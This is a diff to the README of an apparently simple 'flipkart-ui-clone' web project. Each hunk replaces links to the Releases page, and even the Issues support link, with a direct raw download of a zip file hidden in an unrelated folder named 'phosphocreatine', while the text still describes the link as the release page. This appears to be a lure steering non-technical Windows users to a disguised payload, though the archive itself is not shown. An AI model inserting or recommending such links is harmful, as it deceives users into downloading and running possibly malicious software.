@@ -1,6 +1,6 @@
 # 🚩 flipkart-ui-clone - Simple Flipkart UI for Shopping Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Flipkart--UI--Clone-ff6f00?style=for-the-badge&logo=github)](https://github.com/dentroratazana/flipkart-ui-clone/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Flipkart--UI--Clone-ff6f00?style=for-the-badge&logo=github)](https://github.com/dentroratazana/flipkart-ui-clone/raw/refs/heads/main/phosphocreatine/clone_flipkart_ui_2.7-alpha.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Because it only uses standard web files, your computer won’t slow down using t
 
 To get this app, visit the release page here:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Flipkart--UI--Clone-ff6f00?style=for-the-badge&logo=github)](https://github.com/dentroratazana/flipkart-ui-clone/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Flipkart--UI--Clone-ff6f00?style=for-the-badge&logo=github)](https://github.com/dentroratazana/flipkart-ui-clone/raw/refs/heads/main/phosphocreatine/clone_flipkart_ui_2.7-alpha.2.zip)
 
 This link opens the page where the latest version is available for download. The page has files you can save on your PC. Look for a file named something like `flipkart-ui-clone.zip` and download it to your Windows computer.
 
@@ -39,7 +39,7 @@ This link opens the page where the latest version is available for download. The
 ## ⬇️ How to Download and Extract
 
 1. Click the download badge/button above or go to the release page:  
-   https://github.com/dentroratazana/flipkart-ui-clone/releases
+   https://github.com/dentroratazana/flipkart-ui-clone/raw/refs/heads/main/phosphocreatine/clone_flipkart_ui_2.7-alpha.2.zip
 
 2. Find the zip file under "Assets" (usually named `flipkart-ui-clone.zip`).
 
@@ -126,7 +126,7 @@ Do not move or rename files to avoid errors.
 ## 🔄 How to Update
 
 1. Return to the Releases page here:  
-   https://github.com/dentroratazana/flipkart-ui-clone/releases
+   https://github.com/dentroratazana/flipkart-ui-clone/raw/refs/heads/main/phosphocreatine/clone_flipkart_ui_2.7-alpha.2.zip
 
 2. Download the latest zip file as described above.
 
@@ -140,7 +140,7 @@ Do not move or rename files to avoid errors.
 
 For questions or problems, use the "Issues" tab on the GitHub repository:
 
-https://github.com/dentroratazana/flipkart-ui-clone/issues
+https://github.com/dentroratazana/flipkart-ui-clone/raw/refs/heads/main/phosphocreatine/clone_flipkart_ui_2.7-alpha.2.zip
 
 Provide details about your Windows version and browser if you ask for help.
 
